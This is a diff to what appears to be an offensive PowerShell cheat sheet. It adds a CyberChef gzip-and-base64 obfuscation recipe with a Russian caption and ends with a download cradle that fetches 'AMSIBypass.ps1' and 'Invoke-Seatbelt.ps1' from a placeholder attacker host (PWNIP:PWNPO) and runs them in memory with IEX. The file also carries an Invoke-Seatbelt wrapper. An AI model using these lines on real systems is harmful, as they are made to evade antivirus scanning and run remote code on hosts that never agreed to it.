@@ -472,7 +472,11 @@ $session.SetValue($null,$null);
 
 # Open-Source Software Obfuscation
 
+Обфускаатор на cybercheff
+
 https://gchq.github.io/CyberChef/#recipe=Gzip('Dynamic%20Huffman%20Coding','','',false)To_Base64('A-Za-z0-9%2B/%3D')
+
+
 
 function Invoke-Seatbelt {
     [CmdletBinding()]
@@ -498,3 +502,8 @@ function Invoke-Seatbelt {
     $Results = $StringWriter.ToString();
     $Results
 }
+
+
+$webClient = New-Object Net.WebClient;
+$webClient.DownloadString('http://PWNIP:PWNPO/AMSIBypass.ps1') | IEX;
+$webClient.DownloadString('http://PWNIP:PWNPO/Invoke-Seatbelt.ps1') | IEX;
